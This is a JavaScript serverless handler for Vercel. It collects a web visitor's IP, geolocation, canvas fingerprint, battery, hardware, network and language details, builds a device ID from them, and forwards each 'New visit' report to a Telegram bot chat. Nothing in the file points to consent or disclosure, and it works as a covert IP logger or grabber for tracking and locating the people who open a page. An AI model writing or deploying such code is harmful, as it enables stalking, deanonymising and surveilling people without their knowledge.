// api/track.js
// Serverless handler for Vercel: collects client info and forwards it to Telegram.
// Configure the following environment variables in Vercel:
// TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

// Simple hash to avoid pulling in crypto
function simpleHash(str) {
  str = String(str || "");
  let hash = 0;
  for (let i = 0; i < str.length; i++) {
    hash = (hash << 5) - hash + str.charCodeAt(i);
    hash |= 0; // 32-bit int
  }
  return hash.toString(16);
}

module.exports = async (req, res) => {
  res.setHeader("Content-Type", "application/json");

  if (req.method !== "POST") {
    res.statusCode = 405;
    return res.end(JSON.stringify({ ok: false, error: "Method not allowed" }));
  }

  try {
    // ---------- BODY PARSING ----------
    let body = "";
    await new Promise((resolve, reject) => {
      req.on("data", (chunk) => {
        body += chunk;
      });
      req.on("end", resolve);
      req.on("error", reject);
    });

    let js = {};
    try {
      js = body ? JSON.parse(body) : {};
    } catch (e) {
      js = {};
    }

    // ---------- SERVER DATA ----------
    const now = new Date().toISOString();

    let ipHeader =
      req.headers["x-forwarded-for"] ||
      req.headers["x-real-ip"] ||
      req.socket?.remoteAddress ||
      null;

    let ip = Array.isArray(ipHeader) ? ipHeader[0] : ipHeader;
    if (ip && ip.includes(",")) {
      ip = ip.split(",")[0].trim();
    }

    const forwardedIp = req.headers["x-forwarded-for"] || null;
    const userAgent = req.headers["user-agent"] || "";
    const langHeader = req.headers["accept-language"] || "";
    const referer = req.headers["referer"] || "";

    const isMobile = /Mobile|Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(
      userAgent
    )
      ? "Yes"
      : "No";

    // ---------- JS DATA ----------
    const screen_w = js.screen_width ?? "N/A";
    const screen_h = js.screen_height ?? "N/A";
    const avail_w = js.avail_width ?? "N/A";
    const avail_h = js.avail_height ?? "N/A";
    const pixel_ratio = js.pixel_ratio ?? "N/A";

    const timezone_js = js.timezone ?? "N/A";
    const platform_js = js.platform ?? "N/A";
    const vendor_js = js.vendor ?? "N/A";

    const lang_js = js.language ?? "N/A";
    const languages_js = js.languages ?? [];

    const hw_threads = js.hardwareConcurrency ?? "N/A";
    const device_mem = js.deviceMemory ?? "N/A";
    const max_touch_points = js.max_touch_points ?? "N/A";
    const orientation = js.orientation ?? "N/A";
    const ua_js = js.ua ?? "";

    const geolocation = js.geolocation ?? "N/A";
    const canvas_fp = js.canvas_fp ?? "";
    const latency_probe_ms = js.latency_probe_ms ?? "N/A";
    const battery = js.battery ?? {};
    const battery_level =
      typeof battery.level === "number" ? `${battery.level}%` : "N/A";
    const battery_charging =
      typeof battery.charging === "boolean"
        ? battery.charging
          ? "Yes"
          : "No"
        : "N/A";

    const connection = js.connection ?? {};
    const net_type = connection.effectiveType ?? "N/A";
    const net_downlink = connection.downlink ?? "N/A";
    const net_rtt = connection.rtt ?? "N/A";
    const net_saveData =
      typeof connection.saveData === "boolean"
        ? connection.saveData
          ? "Yes"
          : "No"
        : "N/A";

    const ua_model = js.ua_model ?? "N/A";

    const languages_str = Array.isArray(languages_js)
      ? languages_js.join(", ")
      : String(languages_js);

    // ---------- DEVICE ID ----------
    const device_id = simpleHash(
      [
        userAgent,
        `${screen_w}x${screen_h}`,
        timezone_js,
        (canvas_fp || "").slice(0, 64),
        ua_model,
      ].join("|")
    );

    const device_mem_str =
      device_mem !== "N/A" && typeof device_mem === "number"
        ? `${device_mem} GB`
        : String(device_mem);

    // ---------- TELEGRAM MESSAGE ----------
    let msg = `New visit\n\n`;
    msg += `Time: ${now}\n\n`;

    msg += `IP info:\n`;
    msg += `- IP: ${ip || "N/A"}\n`;
    msg += `- X-Forwarded-For: ${forwardedIp || "N/A"}\n\n`;

    msg += `Device:\n`;
    msg += `- Mobile: ${isMobile}\n`;
    msg += `- Platform (JS): ${platform_js}\n`;
    msg += `- Vendor: ${vendor_js}\n`;
    msg += `- Model (UA hints): ${ua_model}\n`;
    msg += `- CPU cores: ${hw_threads}\n`;
    msg += `- RAM: ${device_mem_str}\n`;
    msg += `- Device ID: ${device_id}\n\n`;

    msg += `Network:\n`;
    msg += `- Type: ${net_type}\n`;
    msg += `- Downlink: ${net_downlink} Mbps\n`;
    msg += `- RTT: ${net_rtt} ms\n`;
    msg += `- Data saver: ${net_saveData}\n\n`;

    msg += `Screen:\n`;
    msg += `- Resolution: ${screen_w} x ${screen_h}\n`;
    msg += `- Available: ${avail_w} x ${avail_h}\n`;
    msg += `- Pixel ratio: ${pixel_ratio}\n\n`;

    msg += `Languages:\n`;
    msg += `- Header: ${langHeader}\n`;
    msg += `- JS language: ${lang_js}\n`;
    msg += `- JS languages: ${languages_str}\n\n`;

    msg += `Session:\n`;
    msg += `- Timezone: ${timezone_js}\n`;
    msg += `- Latency probe: ${latency_probe_ms} ms\n\n`;

    msg += `Location:\n`;
    msg += `- Geo: ${geolocation}\n\n`;

    msg += `User-Agent:\n${userAgent}\n`;
    if (ua_js) msg += `UA (JS): ${ua_js}\n`;
    msg += `Touch points: ${max_touch_points}\n`;
    msg += `Orientation: ${orientation}\n`;
    msg += `Battery: ${battery_level} (Charging: ${battery_charging})\n`;
    msg += `Referer: ${referer || "N/A"}`;

    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
      const missing = [];
      if (!TELEGRAM_BOT_TOKEN) missing.push("TELEGRAM_BOT_TOKEN");
      if (!TELEGRAM_CHAT_ID) missing.push("TELEGRAM_CHAT_ID");
      res.statusCode = 500;
      return res.end(
        JSON.stringify({
          ok: false,
          error: `Missing env vars: ${missing.join(", ")}`,
        })
      );
    }

    const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    try {
      const tgRes = await fetch(telegramUrl, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: msg,
        }),
      });

      if (!tgRes.ok) {
        const bodyText = await tgRes.text();
        console.error("Telegram response error:", tgRes.status, bodyText);
      }
    } catch (e) {
      console.error("Telegram fetch error:", e);
    }

    res.statusCode = 200;
    return res.end(JSON.stringify({ ok: true }));
  } catch (err) {
    console.error("Server error:", err);
    res.statusCode = 500;
    return res.end(JSON.stringify({ ok: false, error: "Server error" }));
  }
};
